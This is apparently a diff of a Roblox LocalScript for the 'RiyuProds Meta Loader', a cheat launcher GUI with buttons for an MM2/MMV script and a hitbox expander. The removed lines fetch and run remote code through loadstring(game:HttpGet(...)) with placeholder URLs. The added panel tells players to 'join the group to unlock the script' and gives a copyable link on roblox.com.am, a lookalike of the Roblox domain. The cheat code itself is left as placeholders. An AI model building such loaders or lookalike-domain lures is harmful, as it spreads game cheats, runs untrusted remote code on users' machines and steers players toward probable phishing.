@@ -1,4 +1,4 @@
--- RiyuProds Dual Loader (LocalScript)
+-- RiyuProds Meta Loader - FIXED (LocalScript)
 -- Place in StarterPlayer > StarterPlayerScripts
 
 local Players = game:GetService("Players")
@@ -9,7 +9,7 @@ local player = Players.LocalPlayer
 
 -- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "RiyuProdsLoader"
+screenGui.Name = "RiyuProdsMetaLoader"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
@@ -43,27 +43,11 @@ title.Font = Enum.Font.GothamBold
 title.ZIndex = 5
 title.Parent = mainFrame
 
--- Timebomb Duels Button
-local timebombButton = Instance.new("TextButton")
-timebombButton.Size = UDim2.new(0.85, 0, 0, 55)
-timebombButton.Position = UDim2.new(0.075, 0, 0, 90)
-timebombButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-timebombButton.Text = "LOAD TIMEBOMB DUELS"
-timebombButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-timebombButton.TextScaled = true
-timebombButton.Font = Enum.Font.GothamBold
-timebombButton.ZIndex = 5
-timebombButton.Parent = mainFrame
-
-local tbCorner = Instance.new("UICorner")
-tbCorner.CornerRadius = UDim.new(0, 12)
-tbCorner.Parent = timebombButton
-
 -- MMV / MM2 Button
 local mmButton = Instance.new("TextButton")
 mmButton.Size = UDim2.new(0.85, 0, 0, 55)
-mmButton.Position = UDim2.new(0.075, 0, 0, 160)
-mmButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
+mmButton.Position = UDim2.new(0.075, 0, 0, 90)
+mmButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
 mmButton.Text = "LOAD MMV / MM2"
 mmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 mmButton.TextScaled = true
@@ -75,7 +59,23 @@ local mmCorner = Instance.new("UICorner")
 mmCorner.CornerRadius = UDim.new(0, 12)
 mmCorner.Parent = mmButton
 
--- Hover Effect
+-- Hitbox Expander Button
+local hitboxButton = Instance.new("TextButton")
+hitboxButton.Size = UDim2.new(0.85, 0, 0, 55)
+hitboxButton.Position = UDim2.new(0.075, 0, 0, 160)
+hitboxButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
+hitboxButton.Text = "LOAD RIYU HITBOX EXPANDER"
+hitboxButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+hitboxButton.TextScaled = true
+hitboxButton.Font = Enum.Font.GothamBold
+hitboxButton.ZIndex = 5
+hitboxButton.Parent = mainFrame
+
+local hbCorner = Instance.new("UICorner")
+hbCorner.CornerRadius = UDim.new(0, 12)
+hbCorner.Parent = hitboxButton
+
+-- Hover
 local function addHover(btn, baseColor)
     btn.MouseEnter:Connect(function()
         TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = baseColor:lerp(Color3.fromRGB(255,255,255), 0.2)}):Play()
@@ -85,8 +85,8 @@ local function addHover(btn, baseColor)
     end)
 end
 
-addHover(timebombButton, timebombButton.BackgroundColor3)
 addHover(mmButton, mmButton.BackgroundColor3)
+addHover(hitboxButton, hitboxButton.BackgroundColor3)
 
 -- Snowflakes
 local function createSnowflake()
@@ -115,15 +115,121 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
--- ================== LOAD SCRIPTS ==================
-timebombButton.MouseButton1Click:Connect(function()
-    -- === TIMEBOMB DUELS SCRIPT LOADS HERE ===
-    loadstring(game:HttpGet("YOUR_TIMEBOMB_DUELS_SCRIPT_URL_HERE"))()
+-- ================== MMV / MM2 LOADER (with your new group) ==================
+local mm2LoaderCode = [[
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local groupLink = "https://www.roblox.com.am/communities/364290315340/Riyuprods"
+
+local player = Players.LocalPlayer
+
+local sg = Instance.new("ScreenGui")
+sg.ResetOnSpawn = false
+sg.Parent = player:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 280)
+frame.Position = UDim2.new(0.5, -200, 0.5, -140)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Parent = sg
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,50)
+title.BackgroundTransparency = 1
+title.Text = "RIYUPRODS - MM2/MMV"
+title.TextColor3 = Color3.fromRGB(255,80,80)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+local desc = Instance.new("TextLabel")
+desc.Size = UDim2.new(1,-20,0,60)
+desc.Position = UDim2.new(0,10,0,60)
+desc.BackgroundTransparency = 1
+desc.Text = "Join the group to unlock the script"
+desc.TextColor3 = Color3.fromRGB(255,120,120)
+desc.TextScaled = true
+desc.Font = Enum.Font.GothamSemibold
+desc.TextWrapped = true
+desc.Parent = frame
+
+local linkBox = Instance.new("TextBox")
+linkBox.Size = UDim2.new(0.8,0,0,35)
+linkBox.Position = UDim2.new(0.1,0,0,130)
+linkBox.BackgroundColor3 = Color3.fromRGB(30,30,45)
+linkBox.Text = groupLink
+linkBox.TextColor3 = Color3.fromRGB(100,200,255)
+linkBox.TextScaled = true
+linkBox.ClearTextOnFocus = false
+linkBox.Font = Enum.Font.Code
+linkBox.Parent = frame
+
+local copyBtn = Instance.new("TextButton")
+copyBtn.Size = UDim2.new(0.15,0,0,35)
+copyBtn.Position = UDim2.new(0.85,5,0,130)
+copyBtn.BackgroundColor3 = Color3.fromRGB(70,130,255)
+copyBtn.Text = "COPY"
+copyBtn.TextColor3 = Color3.fromRGB(255,255,255)
+copyBtn.TextScaled = true
+copyBtn.Font = Enum.Font.GothamBold
+copyBtn.Parent = frame
+
+copyBtn.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(groupLink)
+        StarterGui:SetCore("SendNotification", {Title="RiyuProds"; Text="Link Copied!"; Duration=5})
+    end
 end)
 
+print("✅ MMV / MM2 Loader Loaded")
+-- PUT YOUR ACTUAL MM2 / MMV SCRIPT CODE HERE
+]]
+
+-- ================== RIYU HITBOX EXPANDER LOADER ==================
+local hitboxLoaderCode = [[
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local sg = Instance.new("ScreenGui")
+sg.ResetOnSpawn = false
+sg.Parent = player:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 220)
+frame.Position = UDim2.new(0.5, -200, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Parent = sg
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,50)
+title.BackgroundTransparency = 1
+title.Text = "RIYU HITBOX EXPANDER"
+title.TextColor3 = Color3.fromRGB(80, 180, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+print("✅ Riyu Hitbox Expander Loaded")
+-- PUT YOUR ACTUAL TIMEBOMB DUELS / HITBOX EXPANDER CODE HERE
+]]
+
+-- Button Actions
 mmButton.MouseButton1Click:Connect(function()
-    -- === MMV / MM2 SCRIPT LOADS HERE ===
-    loadstring(game:HttpGet("YOUR_MMV_MM2_SCRIPT_URL_HERE"))()
+    loadstring(mm2LoaderCode)()
 end)
 
-print("RiyuProds Dual Loader ready!")
+hitboxButton.MouseButton1Click:Connect(function()
+    loadstring(hitboxLoaderCode)()
+end)
+
+print("✅ RiyuProds Meta Loader ready!")
